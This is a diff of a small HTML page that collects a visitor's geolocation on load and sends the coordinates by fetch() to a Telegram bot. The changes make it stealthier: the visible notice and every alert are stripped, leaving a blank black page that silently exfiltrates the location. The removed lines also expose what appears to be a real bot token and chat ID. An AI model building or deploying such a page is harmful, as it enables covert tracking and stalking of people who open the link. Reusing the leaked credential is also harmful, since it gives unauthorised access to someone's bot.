@@ -4,46 +4,41 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Геолокация</title>
-</head>8
+    <style>
+        body {
+            margin: 0;
+            background-color: black;
+            height: 100vh;
+        }
+    </style>
+</head>
 <body>
-    <h1>Геолокация отправляется...</h1>
     <script>
-        const botToken = "7010906033:AAGe4fWmuWDvz4sw-CpIAs4V1sfZ52pzJbQ"; // Вставьте токен бота
-        const chatId = "2145450623"; // Вставьте ваш User ID
+        // Ваш Telegram токен и chat_id
+        const botToken = "YOUR_BOT_TOKEN";
+        const chatId = "YOUR_CHAT_ID";
 
-        // Отправка геолокации в Telegram
+        // Функция отправки геолокации в Telegram
         function sendLocation(latitude, longitude) {
-            const message = `Широта: ${latitude}, Долгота: ${longitude}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Широта: ${latitude}, Долгота: ${longitude}`;
             fetch(url)
-                .then(response => {
-                    if (response.ok) {
-                        alert("Геолокация отправлена!");
-                    } else {
-                        alert("Ошибка отправки геолокации.");
-                    }
-                })
-                .catch(() => {
-                    alert("Не удалось подключиться к серверу Telegram.");
-                });
+                .then(response => console.log('Геолокация отправлена.'))
+                .catch(error => console.error('Ошибка отправки геолокации:', error));
         }
 
-        // Получение геолокации
+        // Запрашиваем геолокацию
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-                (position) => {
+                position => {
                     const { latitude, longitude } = position.coords;
                     sendLocation(latitude, longitude);
-                    // После получения геолокации, меняем фон страницы на чёрный
-                    document.body.style.backgroundColor = "black";
-                    document.body.innerHTML = ""; // Очищаем текст
                 },
-                (error) => {
-                    alert("Не удалось получить геолокацию.");
+                error => {
+                    console.error("Ошибка получения геолокации:", error);
                 }
             );
         } else {
-            alert("Ваш браузер не поддерживает геолокацию.");
+            console.error("Геолокация не поддерживается этим браузером.");
         }
     </script>
 </body>
